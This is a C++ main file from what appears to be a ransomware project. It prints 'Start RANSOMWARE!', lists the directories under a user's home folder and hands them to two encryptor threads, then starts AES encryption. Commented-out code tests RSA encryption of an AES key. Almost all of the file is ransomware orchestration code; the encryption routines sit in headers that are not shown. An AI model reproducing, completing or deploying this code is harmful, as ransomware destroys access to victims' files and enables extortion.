//
// Created on 24.12.19.
//
#include <iostream>
#include "directory_iterator.h"
#include <thread>
#include <mutex>
#include <cmath>
#include "encryptor.h"
#include "aes_algo.h"
#include "logger.h"

#define DEBUG

std::mutex tmp_mut;
DirectoryIiterator* _directoryIt = new DirectoryIiterator();
void test(std::vector<boost::filesystem::path> paths) {
    tmp_mut.lock();
    for(auto& path: paths ) {
        //std::cout << path << std::endl;
        std::vector<boost::filesystem::path> files = _directoryIt->getFilesFromDir(path);
        for (auto& file: files) {
            std::cout << file << std::endl;
        }
    }


    tmp_mut.unlock();
}

void executor() {
    std::string path3 = "/home/christian/";

    std::unique_ptr<DirectoryIiterator> directoryIt(new DirectoryIiterator());
    std::vector<boost::filesystem::path> dirs = directoryIt->getDirectories(path3);
    std::size_t const half_size = dirs.size() / 2;
    std::vector<boost::filesystem::path> split_lo = {dirs.begin(), dirs.begin() + half_size};
    std::vector<boost::filesystem::path> split_hi = {dirs.begin() + half_size, dirs.end()};

    Encryptor* encryptor1 = new Encryptor(split_lo);
    Encryptor* encryptor2 = new Encryptor(split_hi);

    //std::unique_ptr<encryptor> encryptor2(new encryptor(split_hi));
    encryptor1->start();
    encryptor2->start();

    //encryptor1->join();
    //encryptor2->join();
    while (true) {
        std::cout << "test" << std::endl;
        sleep(1);
    }
}

void old() {
    std::string path = "/home/christian/projects";
    std::string path2 = "/home/christian/";
    std::unique_ptr<DirectoryIiterator> directoryIt(new DirectoryIiterator());
    std::vector<boost::filesystem::path> dirs = directoryIt->getDirectories(path2);
    int n=2;
    std::vector<std::thread> threads(n);
    /*
    for (auto& dir: dirs) {
        std::vector<boost::filesystem::path> files = directoryIt->getFilesFromDir(dir);

        for(auto& file: files){
            std::cout << file << std::endl;
        }
    }*/

    std::size_t const half_size = dirs.size() / 2;

    std::vector<boost::filesystem::path> split_lo(dirs.begin(), dirs.begin() + half_size);
    std::vector<boost::filesystem::path> split_hi(dirs.begin() + half_size, dirs.end());
    std::cout << "sizeNew: " << split_hi.size() << std::endl;


    //test(dirs[i]);
    threads[0] = std::thread(&test, dirs);
    //threads[1] = std::thread(&test, split_hi);

    for (auto& t: threads) {
        t.join();
    }


    std::cout << "DIR Size: " << dirs.size() << std::endl;
}


int main(int argc, char** argv) {

    std::string filepath;
    if (argc > 1) {
        filepath = argv[1];
    } else {
        filepath = "/home/christian/projects/ransomware/config/logconfig.ini";
    }

    Logger::initFromConfig(filepath);


    std::cout << "Start RANSOMWARE!" << std::endl;
    std::string path3 = "/home/christian/";
    /*
    RSAAlgorithm *encrypter = new RSAAlgorithm();
    //RSAAlgorithm *decryptor = new RSAAlgorithm();

    //encrypter->createRSAPublicKeyFile("id_rsa.pub");
    //encrypter->createRSAPrivateKeyFile("id_rsa");
    //RSA *pubKey = encrypter->getPublicKey();

    char* message = "AES Key test 828252052052";

    RSA *pubKey = encrypter->getPublicKeyFromFile("id_rsa.pub");
    char* ct = encrypter->encrypt(pubKey, message);
    std::cout << "Cipher text: " << ct << std::endl;
    sleep(3);

    //RSA *privKey = encrypter->getPrivateKey();
    RSA *privKey = encrypter->getPrivateKeyFromFile("id_rsa");
    char* decrypt = encrypter->decrypt(privKey, ct);

    std::cout << "decrypt: " << decrypt << std::endl;
    */
    std::cout << "start aes encryption" << std::endl;
    AESAlgorithm *aesalgo = new AESAlgorithm();
    aesalgo->start();

    return 0;
}